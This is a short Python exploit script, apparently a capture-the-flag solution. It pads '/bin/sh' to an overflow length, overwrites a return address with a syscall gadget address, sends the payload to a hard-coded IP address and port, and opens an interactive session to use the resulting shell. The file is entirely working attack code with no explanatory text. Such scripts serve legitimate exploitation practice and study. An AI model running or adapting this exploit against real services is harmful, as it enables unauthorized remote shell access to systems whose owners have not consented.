#!/usr/bin/python

from struct import pack,unpack
import socket
import telnetlib

legal = "/bin/sh\x00" + "A" * (0x128 - len("/bin/sh\x00"))
# 4000E7
# F0 - syscall
# FC - set rdx 0x148
# DD call func
payload = "\xED\x00\x40\x00"
payload += "\x00" * 22
# payload = "B" * 8
# payload += "C" * 8
# payload += "D" * 8
# payload += "E" * 8


host = '159.65.125.233'
port = 6009
print("Syscall = %x / %d" % ( len(legal + payload),  len(legal + payload) ))
sockfd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sockfd.connect((host,port))
tn = telnetlib.Telnet()
tn.sock = sockfd

# fd = open('payload', 'wb')
# fd.write(legal + payload)
# fd.close()

sockfd.send(legal + payload)

tn.interact()

